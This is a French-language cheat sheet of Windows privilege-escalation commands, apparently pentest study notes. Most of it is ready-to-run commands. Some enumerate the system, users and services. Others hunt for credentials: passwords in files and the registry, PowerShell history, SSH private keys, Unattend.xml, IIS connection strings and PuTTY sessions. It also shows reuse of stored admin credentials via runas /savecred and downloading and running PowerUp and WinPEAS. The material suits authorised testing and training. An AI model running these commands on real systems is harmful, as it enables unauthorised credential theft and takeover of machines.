# Privesc Windows

Voici une liste des commandes et outils utiles pour rechercher et exploiter des vulnérabilités d'escalade de privilèges (privilege escalation) sur un système Windows, avec des explications pour chaque commande.

***

### 1. **Informations sur le Système**

**Système et Version**

Ces commandes affichent les informations sur le système d'exploitation et sa version.

```cmd
systeminfo             # Affiche les informations détaillées sur le système
ver                    # Affiche la version du système d'exploitation
wmic os get Caption,CSDVersion /value   # Affiche le nom complet et la version du système d'exploitation
```

**Architecture**

Ces commandes aident à identifier l'architecture du système (32 bits ou 64 bits).

```cmd
echo %PROCESSOR_ARCHITECTURE%   # Affiche l'architecture du processeur
wmic os get osarchitecture      # Affiche l'architecture du système d'exploitation
```

***

### 2. **Informations sur l'Utilisateur et les Groupes**

**Utilisateur actuel**

Ces commandes montrent des informations sur l'utilisateur courant et ses groupes.

```cmd
whoami            # Affiche le nom de l'utilisateur actuellement connecté
whoami /priv      # Affiche les privilèges de l'utilisateur actuel
whoami /groups    # Liste tous les groupes auxquels l'utilisateur appartient
```

**Liste des utilisateurs**

Ces commandes permettent d'afficher tous les utilisateurs du système.

```cmd
net user                        # Liste tous les utilisateurs locaux
wmic useraccount get name       # Liste les comptes d'utilisateurs locaux
```

**Liste des groupes**

Ces commandes permettent d'afficher tous les groupes du système.

```cmd
net localgroup                   # Liste tous les groupes locaux
net localgroup Administrators    # Liste les membres du groupe Administrators
```

***

### 3. **Permissions de Fichiers et Répertoires**

**Rechercher les fichiers sensibles**

Ces commandes recherchent des fichiers contenant des mots-clés spécifiques tels que "password".

```cmd
dir /S /B *pass* 2>nul           # Rechercher les fichiers contenant "pass" dans le nom
findstr /si password *.txt       # Rechercher des mots de passe dans les fichiers texte
```

**Répertoires accessibles en écriture**

Ces commandes montrent les répertoires où l'utilisateur actuel peut écrire, ce qui peut permettre de manipuler des fichiers.

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer -and $_.GetAccessControl().AccessToString -match "Write" }
```

***

### 4. **Services et Processus**

**Processus en cours d'exécution**

Ces commandes affichent les processus actuellement en cours sur le système.

```cmd
tasklist                         # Affiche tous les processus en cours d'exécution
wmic process list brief          # Affiche un bref aperçu des processus
```

**Services et Démon**

Ces commandes listent les services et démons actifs ou en cours d'exécution.

```cmd
net start                        # Affiche les services en cours d'exécution
sc query state= all              # Affiche l'état de tous les services
wmic service list brief          # Liste les services avec leur statut
```

**Tâches planifiées**

Ces commandes affichent les tâches planifiées qui pourraient contenir des scripts ou commandes exécutées avec des privilèges élevés.

```cmd
schtasks /query /fo LIST /v      # Affiche toutes les tâches planifiées avec des détails
```

**Autorisations de fichiers sur l'exécutable**

```
icacls <Chemin de l'exécutable> 
NT AUTHORITY\SYSTEM:(I)(F) 
BUILTIN\Administrators:(I)(F) 
BUILTIN\Users:(I)(F)
```

(F) signifie que tous les droits sont donnés

***

### 5. **Réseau**

**Interfaces réseau et configuration**

Ces commandes montrent la configuration des interfaces réseau et leur état.

```cmd
ipconfig /all                    # Affiche les informations de configuration IP détaillées
netsh interface show interface   # Affiche les interfaces réseau et leur statut
```

**Connexions réseau actives**

Ces commandes montrent les connexions réseau actives et les processus qui les utilisent.

```cmd
netstat -ano                     # Affiche toutes les connexions TCP/UDP avec les PID des processus
```

**Configuration de pare-feu**

Ces commandes montrent la configuration actuelle du pare-feu.

```cmd
netsh advfirewall firewall show rule name=all    # Affiche toutes les règles de pare-feu
```

***

### 6. **Informations Système et Registre**

**Informations sur la mémoire et la CPU**

Ces commandes fournissent des informations sur la mémoire et l'utilisation du processeur.

```cmd
systeminfo | findstr /C:"Total Physical Memory"   # Affiche la mémoire physique totale
wmic cpu get caption, deviceid, name, numberofcores, maxclockspeed, status   # Affiche les informations du CPU
```

**Registre Windows**

Ces commandes permettent de rechercher des informations potentiellement sensibles dans le registre.

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run   # Liste les programmes qui s'exécutent au démarrage
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run   # Idem pour l'utilisateur courant
reg query HKLM /f password /t REG_SZ /s                        # Rechercher des mots de passe dans le registre
```

***

### 7. **Informations sur les Applications**

**Paquets installés**

Ces commandes listent les paquets installés sur le système, permettant d'identifier les logiciels potentiellement vulnérables.

```cmd
wmic product get name,version    # Liste tous les logiciels installés
```

**Applications installées et leur version**

Ces commandes listent les applications dans les répertoires système standards.

```cmd
dir "C:\Program Files" /b        # Liste les applications dans Program Files
dir "C:\Program Files (x86)" /b  # Liste les applications 32 bits installées sur un OS 64 bits
```

***

### 8. **Exploration de fichiers et d'accès**

**Fichiers de configuration RDP**

Ces fichiers peuvent contenir des configurations faibles ou des informations sensibles.

```cmd
type C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\RemoteDesktop\rdpinit.exe.log
```

**Historique des commandes PowerShell**

Ces fichiers peuvent contenir des informations sensibles telles que des mots de passe en clair.

```powershell
type (Get-PSReadlineOption).HistorySavePath    # Affiche l'historique des commandes PowerShell
```

**Clés SSH**

Ces fichiers peuvent contenir des clés privées SSH permettant l'accès à distance.

```cmd
dir /s /b *id_rsa*     # Recherche des clés SSH privées
```

***

### 9. **Logs et journaux**

**Fichiers de log système**

Ces fichiers peuvent contenir des erreurs, des tentatives d'accès, ou d'autres informations sensibles.

```cmd
type C:\Windows\System32\winevt\Logs\Security.evtx   # Affiche les logs de sécurité
```

***

### 10. **Sécurité et Audits**

**Droits d'accès utilisateur**

Vérifie les droits et permissions de l'utilisateur actuel et des groupes.

```cmd
whoami /priv   # Affiche les privilèges de l'utilisateur actuel
accesschk.exe /accepteula -uws "Everyone" "C:\Program Files"   # Utilise AccessChk pour vérifier les permissions
```

***

### 11. **AppLocker et autres politiques de sécurité**

**Statut d'AppLocker**

Vérifie si AppLocker est activé et répertorie les politiques.

```powershell
Get-AppLockerPolicy -Effective -XML   # Affiche la politique AppLocker effective
```

**Statut de Windows Defender**

Vérifie si Windows Defender est activé et ses paramètres.

```cmd
sc query windefend   # Vérifie le statut du service Windows Defender
```

***

### 12. **Scripts d'attaque et d'exploitation**

**Recherche d'exploits locaux connus**

Télécharger et exécuter des scripts d'exploitation locaux pour automatiser la collecte d'informations.

* **PowerUp** et **WinPEAS** sont des scripts populaires pour cette tâche.

```powershell
# PowerUp - Un script PowerShell pour identifier les faiblesses de configuration
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -OutFile "PowerUp.ps1"
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# WinPEAS - Un outil de script de recherche automatique de failles
Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/download/20230827/winPEASx64.exe" -OutFile "winPEASx64.exe"
.\winPEASx64.exe
```

Ces commandes et outils aident à identifier les vecteurs d'attaque potentiels pour l'escalade de privilèges sur un système Windows en exploitant les configurations faibles, les permissions incorrectes, et d'autres vulnérabilités.

***

### **13. Emplacements intéressants:**

C:\Unattend.xml&#x20;

C:\Windows\Panther\Unattend.xml&#x20;

C:\Windows\Panther\Unattend\Unattend.xml&#x20;

C:\Windows\system32\sysprep.inf&#x20;

C:\Windows\system32\sysprep\sysprep.xml

**Historique Powershell**

cmd:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Powershell:

```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Informations d'identification Windows enregistrées**

```
cmdkey /list
```

```
runas /savecred /user:admin cmd.exe
```

**Configuration IIS (webadmin)**

C:\inetpub\wwwroot\web.config

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

**Récupérer les identifiants à partir du logiciel : PuTTY**

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
